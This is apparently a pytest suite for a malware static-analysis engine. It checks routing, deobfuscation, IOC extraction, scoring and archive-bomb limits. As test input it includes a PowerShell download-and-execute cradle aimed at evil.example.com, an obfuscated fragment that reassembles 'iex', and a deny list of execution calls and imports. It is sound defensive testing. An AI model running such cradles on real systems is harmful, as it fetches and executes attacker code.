"""Tier 1 static analysis engine (#1067, epic #974).

Covers the four things that would actually hurt if they broke:

1. **The safety bar** — no inspector may execute, evaluate or shell out. Checked
   structurally with ``ast`` over the whole module, not by reading the code.
2. **Content beats extension** — a renamed sample must still route correctly.
3. **The limits** — archive depth, expansion and object caps, enforced against
   declared sizes so a bomb never gets decompressed.
4. **The scoring contract** — a closed flag catalogue, additive weights, and
   verdicts that stay explainable.

Run with: cd backend && python -m pytest tests/test_file_analysis_engine.py
"""

import ast
import base64
import os
import pathlib

import pytest

os.environ.setdefault("JWT_SECRET", "test-only-secret-not-the-compromised-default")

from app.file_analysis.services import identify as identify_svc  # noqa: E402
from app.file_analysis.services import iocs as ioc_svc  # noqa: E402
from app.file_analysis.services import scoring  # noqa: E402
from app.file_analysis.services.inspectors import all_inspectors  # noqa: E402
from app.file_analysis.services.inspectors import select_inspector  # noqa: E402
from app.file_analysis.services.inspectors.base import InspectorContext  # noqa: E402
from app.file_analysis.services.limits import AnalysisLimits  # noqa: E402
from app.file_analysis.services.limits import load_limits  # noqa: E402
from app.file_analysis.utils.deobfuscate import MAX_PASSES  # noqa: E402
from app.file_analysis.utils.deobfuscate import deobfuscate  # noqa: E402
from tests import file_analysis_samples as samples  # noqa: E402

MODULE_ROOT = pathlib.Path(__file__).resolve().parent.parent / "app" / "file_analysis"


def inspect(data: bytes, file_name: str, mime_type: str = "", limits: AnalysisLimits = None):
    """Route a sample and run its inspector, the way the orchestrator does."""
    inspector = select_inspector(data, mime_type, file_name)
    assert inspector is not None, f"no inspector claimed {file_name}"
    ctx = InspectorContext(
        data=data,
        file_name=file_name,
        mime_type=mime_type,
        magic_type="",
        limits=limits or load_limits(),
    )
    return inspector, inspector.inspect(ctx)


# ---------------------------------------------------------------------------
# 1. Safety bar — the invariant that lets Tier 1 run on the CoPilot host
# ---------------------------------------------------------------------------

FORBIDDEN_CALLS = {"eval", "exec", "compile", "__import__"}
FORBIDDEN_IMPORTS = {"subprocess", "pickle", "shelve", "marshal", "pty", "commands"}
FORBIDDEN_ATTRIBUTE_CALLS = {("os", "system"), ("os", "popen"), ("os", "execv"), ("os", "spawnv")}


def _python_sources():
    return sorted(MODULE_ROOT.rglob("*.py"))


def test_no_inspector_executes_the_sample():
    """AST-level proof, not a grep.

    A grep would trip over the literal string "eval" in the PDF inspector's
    JavaScript marker list -- which is a *detection* for the sample containing
    eval, the opposite of the module calling it. Walking the tree distinguishes
    the two.
    """
    offences = []

    for path in _python_sources():
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                func = node.func
                if isinstance(func, ast.Name) and func.id in FORBIDDEN_CALLS:
                    offences.append(f"{path.name}:{node.lineno} calls {func.id}()")
                if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
                    if (func.value.id, func.attr) in FORBIDDEN_ATTRIBUTE_CALLS:
                        offences.append(f"{path.name}:{node.lineno} calls {func.value.id}.{func.attr}()")
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name.split(".")[0] in FORBIDDEN_IMPORTS:
                        offences.append(f"{path.name}:{node.lineno} imports {alias.name}")
            if isinstance(node, ast.ImportFrom) and node.module:
                if node.module.split(".")[0] in FORBIDDEN_IMPORTS:
                    offences.append(f"{path.name}:{node.lineno} imports from {node.module}")

    assert not offences, "file_analysis must never execute a sample:\n" + "\n".join(offences)


def test_module_has_sources_to_check():
    """Guards the test above from silently passing on an empty file list."""
    assert len(_python_sources()) >= 10


# ---------------------------------------------------------------------------
# 2. Identification and routing — content decides, never the extension
# ---------------------------------------------------------------------------


def test_pdf_renamed_to_txt_still_routes_to_the_pdf_inspector():
    data = samples.pdf_with_openaction_and_js()
    inspector = select_inspector(data, "text/plain", "totally-a-note.txt")
    assert inspector is not None and inspector.name == "pdf"


def test_extension_is_only_consulted_for_generic_content_types():
    # A PowerShell script is text/plain to libmagic; the extension is the only
    # thing that can distinguish it from a CSV.
    inspector = select_inspector(b"Write-Host 'hi'", "text/plain", "run.ps1")
    assert inspector is not None and inspector.name == "script"

    # But a concrete content type wins outright over a misleading name.
    inspector = select_inspector(samples.pdf_with_openaction_and_js(), "application/pdf", "run.ps1")
    assert inspector.name == "pdf"


def test_ooxml_reported_as_a_plain_zip_still_routes_to_office():
    """libmagic calls OOXML ``application/zip`` often enough to matter.

    Without the content probe this lands on the archive inspector, which lists
    ``word/vbaProject.bin`` as an unremarkable member and raises no
    ``office.*`` flag at all -- a macro-enabled document scoring zero.
    """
    inspector = select_inspector(samples.docm_with_vba_project(), "application/zip", "invoice.docm")
    assert inspector is not None and inspector.name == "office"

    _, result = inspect(samples.docm_with_vba_project(), "invoice.docm", mime_type="application/zip")
    assert "office.macro_present" in result.flags


def test_a_plain_zip_is_not_claimed_by_the_office_inspector():
    """The probe keys on the OPC manifest part, not on a folder name."""
    data = samples.zip_with({"word/notes.txt": b"just a folder called word"})
    inspector = select_inspector(data, "application/zip", "bundle.zip")
    assert inspector is not None and inspector.name == "archive"


def test_extension_mismatch_is_reported():
    mismatch = identify_svc.detect_extension_mismatch(
        samples.pdf_with_openaction_and_js(),
        "application/pdf",
        "invoice.ps1",
    )
    assert mismatch is not None
    assert "pdf" in mismatch


def test_extension_mismatch_fires_when_the_extension_claims_nothing():
    """Regression: a PDF delivered as invoice.txt raised nothing.

    The earlier check resolved *both* sides to an inspector and compared them.
    No inspector claims ``.txt``, so the missing second opinion read as
    agreement and the most common disguise of all went unflagged.
    """
    mismatch = identify_svc.detect_extension_mismatch(
        samples.pdf_with_openaction_and_js(),
        "application/pdf",
        "invoice.txt",
    )
    assert mismatch is not None
    assert "pdf" in mismatch


def test_no_mismatch_when_the_content_is_unrecognised():
    """Nothing identified the format, so there is nothing to contradict."""
    assert (
        identify_svc.detect_extension_mismatch(
            b"\x00\x01\x02 arbitrary bytes",
            "application/octet-stream",
            "sample.dat",
        )
        is None
    )


def test_matching_extension_reports_no_mismatch():
    assert (
        identify_svc.detect_extension_mismatch(
            samples.pdf_with_openaction_and_js(),
            "application/pdf",
            "invoice.pdf",
        )
        is None
    )


def test_hashes_and_size_are_computed_over_the_content():
    import hashlib

    data = samples.ioc_bearing_text()
    identification = identify_svc.identify(data)

    assert identification.sha256 == hashlib.sha256(data).hexdigest()
    assert identification.sha1 == hashlib.sha1(data).hexdigest()
    assert identification.md5 == hashlib.md5(data).hexdigest()
    assert identification.size == len(data)
    assert 0.0 <= identification.entropy <= 8.0


def test_eicar_is_detected():
    assert identify_svc.contains_eicar(samples.eicar_file())
    assert not identify_svc.contains_eicar(b"an ordinary file")


def test_high_entropy_is_ignored_for_natively_compressed_types():
    # A JPEG at 7.9 is a JPEG; a Word document at 7.9 is carrying something.
    assert not identify_svc.high_entropy_for_type(7.9, "image/jpeg")
    assert identify_svc.high_entropy_for_type(7.9, "application/msword")


# ---------------------------------------------------------------------------
# 3. Deobfuscation — string rewriting only
# ---------------------------------------------------------------------------


def test_utf16_base64_encoded_command_is_decoded():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()

    result = deobfuscate(f"powershell -enc {encoded}")

    assert "base64" in result.layers
    assert "evil.example.com" in result.text


def test_layered_obfuscation_is_peeled_across_passes():
    result = deobfuscate("""$a = [char]105+[char]101+[char]120 ; $b='inv'+'oke'; $c="{1}{0}" -f 'oke','Inv'""")

    assert {"char_codes", "concat", "format_operator"}.issubset(set(result.layers))
    assert "iex" in result.text
    assert "invoke" in result.text.lower()


def test_deobfuscation_converges_and_is_idempotent():
    """Regression: every base64-bearing script ran the full pass ceiling.

    ``_expand_base64`` used to append the decoded text and leave the encoded run
    in place, so the run matched again on the next pass, decoded again and
    appended again. Three consequences, all bad: the loop never converged, the
    buffer grew on every pass (CPU-bound work in a worker thread, which starved
    the event loop under load), and every such script came back falsely flagged
    ``script.deep_obfuscation`` at high severity.

    Every transform must be idempotent -- applied to its own output it must
    change nothing -- or the fixpoint below cannot terminate early.
    """
    once = deobfuscate(samples.obfuscated_powershell().decode())

    assert not once.hit_pass_limit, f"did not converge: {once.passes} passes"
    assert once.passes < MAX_PASSES

    twice = deobfuscate(once.text)
    assert twice.layers == [], f"not idempotent, fired again: {twice.layers}"


def test_deobfuscation_output_does_not_grow_with_input_size():
    """The buffer must shrink or hold, never compound across passes."""
    payload = samples.obfuscated_powershell().decode()
    large = (payload + "\n") * 200

    result = deobfuscate(large)

    assert not result.hit_pass_limit
    assert len(result.text) <= len(large)


def test_clean_text_reports_no_layers():
    result = deobfuscate("Get-Process | Where-Object { $_.CPU -gt 10 }")
    assert result.layers == []
    assert not result.hit_pass_limit


def test_base64_run_that_is_not_text_is_left_alone():
    # A long hex-ish identifier decodes to bytes that are not text; substituting
    # that in would bury the real script in noise.
    noise = "A" * 40
    result = deobfuscate(f"$id = '{noise}'")
    assert "decoded(base64)" not in result.text


# ---------------------------------------------------------------------------
# 4. Indicators
# ---------------------------------------------------------------------------


def test_network_indicators_are_defanged_and_others_are_not():
    found = {(i.ioc_type, i.value) for i in ioc_svc.extract_iocs(samples.ioc_bearing_text().decode())}
    types = {t for t, _ in found}

    assert "url" in types and "ipv4" in types and "email" in types

    for ioc_type, value in found:
        if ioc_type in ioc_svc.DEFANGED_TYPES:
            assert "[.]" in value or "[@]" in value, f"{ioc_type} left live: {value}"
        else:
            # A path or hash must stay verbatim -- it is not clickable and
            # mangling it breaks grep, copy and readability.
            assert "[.]" not in value, f"{ioc_type} needlessly defanged: {value}"


def test_defang_round_trips():
    original = "http://evil.example.com/a.php"
    assert ioc_svc.refang(ioc_svc.defang(original)) == original


def test_registry_key_stops_at_the_end_of_the_key():
    text = "HKLM\\Software\\Run payload.dll 44d88612fea8a8f36de82e1278abb02f HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
    keys = [i.value for i in ioc_svc.extract_iocs(text) if i.ioc_type == "registry_key"]

    assert "HKLM\\Software\\Run" in keys
    # A key containing a legitimate space is still captured whole.
    assert any(k.endswith("Windows NT\\CurrentVersion") for k in keys)
    # And no single match bridges from one key across to the next.
    assert not any(k.count("HKLM") > 1 for k in keys)


def test_filenames_are_not_reported_as_domains():
    domains = [i.value for i in ioc_svc.extract_iocs("loader.dll dropper.exe script.ps1 report.docx") if i.ioc_type == "domain"]
    assert domains == []


def test_deobfuscated_context_wins_when_merging():
    plain = ioc_svc.extract_iocs("http://a.example.com", context=ioc_svc.CONTEXT_TEXT)
    peeled = ioc_svc.extract_iocs("http://a.example.com", context=ioc_svc.CONTEXT_DEOBFUSCATED)

    merged = ioc_svc.merge_iocs([plain, peeled])

    assert len(merged) == 1
    assert merged[0].context == ioc_svc.CONTEXT_DEOBFUSCATED


# ---------------------------------------------------------------------------
# 5. Scoring
# ---------------------------------------------------------------------------


def test_flag_catalogue_is_closed():
    with pytest.raises(KeyError):
        scoring.flag_spec("something.invented")


def test_every_flag_an_inspector_can_raise_exists_in_the_catalogue():
    """The catalogue is what the Graylog field set is derived from.

    A flag key emitted but absent here would reach Graylog as a brand-new field
    and split every rule matching the correct spelling, so the two must not be
    allowed to drift.
    """
    emitted = set()
    for path in _python_sources():
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if isinstance(func, ast.Attribute) and func.attr == "add" and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str) and "." in first.value:
                    emitted.add(first.value)

    unknown = sorted(flag for flag in emitted if flag not in scoring.FLAG_CATALOGUE)
    assert not unknown, f"flags emitted but not catalogued: {unknown}"


def test_score_is_additive_and_deduplicated():
    once = scoring.score_flags(["pdf.javascript"])
    twice = scoring.score_flags(["pdf.javascript", "pdf.javascript"])
    both = scoring.score_flags(["pdf.javascript", "pdf.open_action"])

    assert twice == once, "a repeated flag must not compound"
    assert both == once + scoring.flag_spec("pdf.open_action").weight


def test_verdict_thresholds():
    assert scoring.verdict_for(0, inspected=True) == scoring.VERDICT_CLEAN
    assert scoring.verdict_for(scoring.SUSPICIOUS_THRESHOLD, inspected=True) == scoring.VERDICT_SUSPICIOUS
    assert scoring.verdict_for(scoring.MALICIOUS_THRESHOLD, inspected=True) == scoring.VERDICT_MALICIOUS


def test_uninspected_file_is_unknown_not_clean():
    """Reporting "clean" would assert something the engine never checked."""
    assert scoring.verdict_for(0, inspected=False) == scoring.VERDICT_UNKNOWN


def test_a_scored_file_is_never_unknown_even_without_an_inspector():
    """Regression: EICAR came back "unknown" while sitting at score 100.

    Identification raises scored flags of its own (EICAR, extension mismatch),
    so a file no format inspector claims can still score. Checking ``inspected``
    before the score buried a malicious result under a label that reads as
    "nothing to see" -- the worst failure this function can produce.
    """
    eicar_score = scoring.score_flags(["generic.eicar"])

    assert scoring.verdict_for(eicar_score, inspected=False) == scoring.VERDICT_MALICIOUS
    assert scoring.verdict_for(scoring.SUSPICIOUS_THRESHOLD, inspected=False) == scoring.VERDICT_SUSPICIOUS


def test_eicar_alone_reaches_malicious():
    assert scoring.verdict_for(scoring.score_flags(["generic.eicar"]), inspected=True) == scoring.VERDICT_MALICIOUS


def test_limit_flags_never_contribute_to_the_score():
    """A limit says something about the analysis, not about the sample."""
    limit_flags = [flag for flag in scoring.FLAG_CATALOGUE if flag.startswith("limit.")]
    assert limit_flags
    assert scoring.score_flags(limit_flags) == 0


# ---------------------------------------------------------------------------
# 6. PDF inspector
# ---------------------------------------------------------------------------


def test_pdf_javascript_hidden_in_a_compressed_stream_is_found():
    _, result = inspect(samples.pdf_with_openaction_and_js(), "invoice.pdf")

    assert "pdf.javascript" in result.flags
    assert "pdf.open_action" in result.flags
    # The URL only exists inside the Flate-compressed stream.
    assert any("malware[.]example[.]com" in ioc.value for ioc in result.iocs)


def test_pdf_launch_action_is_flagged():
    _, result = inspect(samples.pdf_with_launch_action(), "doc.pdf")
    assert "pdf.launch_action" in result.flags


def test_truncated_pdf_does_not_raise():
    _, result = inspect(samples.truncated_pdf(), "broken.pdf")
    assert isinstance(result.flags, list)


# ---------------------------------------------------------------------------
# 7. Office inspector
# ---------------------------------------------------------------------------


def test_ooxml_vba_project_is_detected():
    _, result = inspect(samples.docm_with_vba_project(), "invoice.docm")
    assert "office.macro_present" in result.flags


def test_remote_template_injection_is_detected_and_never_fetched():
    _, result = inspect(samples.docx_with_remote_template(), "invoice.docx")

    assert "office.remote_template" in result.flags
    # Reported as an indicator, defanged -- the point being it was read, not
    # resolved. Fetching it would call back to the author.
    assert any("templates[.]example[.]com" in ioc.value for ioc in result.iocs)


def test_dde_field_is_detected_in_ooxml():
    _, result = inspect(samples.docx_with_dde(), "invoice.docx")
    assert "office.dde_field" in result.flags


def test_dde_field_is_detected_in_legacy_ole():
    _, result = inspect(samples.legacy_ole_with_dde(), "invoice.doc", mime_type="application/msword")
    assert "office.dde_field" in result.flags


def test_encrypted_office_package_is_reported_not_failed():
    _, result = inspect(samples.encrypted_ole_package(), "protected.doc", mime_type="application/msword")
    assert "office.encrypted" in result.flags


# ---------------------------------------------------------------------------
# 8. Script inspector
# ---------------------------------------------------------------------------


def test_obfuscated_download_cradle_is_flagged():
    _, result = inspect(samples.obfuscated_powershell(), "update.ps1")

    assert "script.obfuscated" in result.flags
    assert "script.encoded_command" in result.flags
    assert "script.download_invocation" in result.flags
    assert "script.hidden_window" in result.flags
    assert any("payload[.]example[.]com" in ioc.value for ioc in result.iocs)


def test_indicators_recovered_by_deobfuscation_carry_that_context():
    _, result = inspect(samples.obfuscated_powershell(), "update.ps1")
    hidden = [ioc for ioc in result.iocs if "payload[.]example[.]com" in ioc.value]
    assert hidden and hidden[0].context == ioc_svc.CONTEXT_DEOBFUSCATED


def test_plain_script_yields_indicators_without_obfuscation_flags():
    _, result = inspect(samples.plain_script_with_iocs(), "notes.ps1")

    assert "script.obfuscated" not in result.flags
    types = {ioc.ioc_type for ioc in result.iocs}
    assert {"url", "ipv4", "path", "registry_key"}.issubset(types)


# ---------------------------------------------------------------------------
# 9. Archive inspector and the limits
# ---------------------------------------------------------------------------


def test_password_protected_entry_is_reported():
    data = samples.zip_with({"secret.txt": b"hidden"}, encrypt=True)
    _, result = inspect(data, "bundle.zip", mime_type="application/zip")
    assert "archive.encrypted" in result.flags


def test_double_extension_is_flagged():
    _, result = inspect(samples.zip_with_double_extension(), "bundle.zip", mime_type="application/zip")
    assert "archive.double_extension" in result.flags


def test_executable_content_is_flagged_by_content_not_only_by_name():
    _, result = inspect(samples.zip_with_executable(), "bundle.zip", mime_type="application/zip")
    assert "archive.executable_content" in result.flags


def test_archive_recursion_stops_at_the_depth_limit():
    limits = load_limits()._replace(max_archive_depth=2)
    data = samples.nested_zip(depth=5)

    _, result = inspect(data, "nested.zip", mime_type="application/zip", limits=limits)

    assert "limit.depth_reached" in result.flags
    assert result.truncated_reason


def test_object_cap_stops_expansion_and_says_so():
    limits = load_limits()._replace(max_extracted_objects=2)
    data = samples.zip_with({f"file{i}.txt": b"x" * 32 for i in range(10)})

    _, result = inspect(data, "many.zip", mime_type="application/zip", limits=limits)

    assert "limit.object_cap_reached" in result.flags
    assert result.truncated_reason


def test_expanded_size_cap_is_checked_before_decompressing():
    """The bomb defence: budget is reserved from the *declared* size.

    Measuring after decompression is what lets a 42 KB archive that expands to
    petabytes take the host down before the result can be weighed.
    """
    limits = load_limits()._replace(max_expanded_size=64)
    # Highly compressible: small on disk, large when expanded.
    data = samples.zip_with({"big.txt": b"A" * 1_000_000})

    _, result = inspect(data, "bomb.zip", mime_type="application/zip", limits=limits)

    assert "limit.size_reached" in result.flags


def test_nested_archive_is_noted():
    data = samples.nested_zip(depth=2)
    _, result = inspect(data, "nested.zip", mime_type="application/zip")
    assert "archive.nested_archive" in result.flags


def test_seven_zip_is_identified_but_not_expanded():
    _, result = inspect(samples.seven_zip_stub(), "bundle.7z")
    assert result.truncated_reason and "7z" in result.truncated_reason


# ---------------------------------------------------------------------------
# 10. Registry hygiene
# ---------------------------------------------------------------------------


def test_every_inspector_declares_a_unique_name():
    names = [inspector.name for inspector in all_inspectors()]
    assert len(names) == len(set(names))
    assert "base" not in names


def _run_analysis_ast():
    source = (MODULE_ROOT / "services" / "analysis.py").read_text()
    tree = ast.parse(source, filename="analysis.py")
    for node in ast.walk(tree):
        if isinstance(node, ast.AsyncFunctionDef) and node.name == "_run_analysis":
            return node
    raise AssertionError("_run_analysis not found")


def test_analysis_runs_without_holding_a_database_connection():
    """Regression: the pool was exhausted and the whole app started 401ing.

    The first version wrapped run_analysis in one session, so a connection
    stayed checked out for the MinIO download and the entire inspector run. A
    handful of concurrent submissions hit ``QueuePool limit of size 5 overflow
    10 reached``, and because the pool is shared, authentication for every other
    request failed alongside it.

    Asserted structurally rather than by load test: the call to _analyse must
    not be lexically inside a get_db_session block.
    """
    run_analysis = _run_analysis_ast()

    def calls_analyse(node):
        return any(
            isinstance(inner, ast.Call) and isinstance(inner.func, ast.Name) and inner.func.id == "_analyse" for inner in ast.walk(node)
        )

    for node in ast.walk(run_analysis):
        if not isinstance(node, ast.AsyncWith):
            continue
        opens_session = any(
            isinstance(item.context_expr, ast.Call)
            and isinstance(item.context_expr.func, ast.Name)
            and item.context_expr.func.id == "get_db_session"
            for item in node.items
        )
        if opens_session and calls_analyse(node):
            raise AssertionError("_run_analysis calls _analyse while holding a database session")


def test_analysis_concurrency_is_bounded():
    """Regression: a burst of uploads saturated the shared connection pool.

    Every submission queues a background analysis. Without a ceiling, twelve
    uploads meant twelve analyses in flight, and the pool they compete for is
    the one the whole application uses -- login itself started returning 401
    during the burst.
    """
    source = (MODULE_ROOT / "services" / "analysis.py").read_text()
    tree = ast.parse(source, filename="analysis.py")

    entrypoint = next(node for node in ast.walk(tree) if isinstance(node, ast.AsyncFunctionDef) and node.name == "run_analysis")

    guarded = any(
        isinstance(node, ast.AsyncWith)
        and any(
            isinstance(item.context_expr, ast.Call)
            and isinstance(item.context_expr.func, ast.Name)
            and item.context_expr.func.id == "_slots"
            for item in node.items
        )
        for node in ast.walk(entrypoint)
    )
    assert guarded, "run_analysis must acquire a concurrency slot before analysing"
    assert AnalysisLimits().max_concurrent_analyses > 0


def test_completed_is_written_after_the_findings():
    """Regression: polling clients could read a completed job with no findings.

    Marking the job completed in its own earlier commit published a result
    before its children were persisted, so a client that polled at the wrong
    moment saw a finished job with an empty finding list and a score that did
    not match it. The status is the publishing act and must be written last.
    """
    source = (MODULE_ROOT / "services" / "analysis.py").read_text()

    persist_at = source.index("_persist_children(session, job, result, inspector_name)")
    completed_at = source.index("job.status = STATUS_COMPLETED")

    assert persist_at < completed_at, "job.status = STATUS_COMPLETED must come after _persist_children"

    between = source[persist_at:completed_at]
    assert "await session.commit()" not in between, "children and completed status must land in the same transaction"


def test_limits_ignore_malformed_overrides(monkeypatch):
    """A typo in a limit must not stop the backend from booting."""
    monkeypatch.setenv("FILE_ANALYSIS_MAX_ARCHIVE_DEPTH", "not-a-number")
    monkeypatch.setenv("FILE_ANALYSIS_MAX_EXTRACTED_OBJECTS", "-5")

    limits = load_limits()

    assert limits.max_archive_depth == AnalysisLimits().max_archive_depth
    assert limits.max_extracted_objects == AnalysisLimits().max_extracted_objects
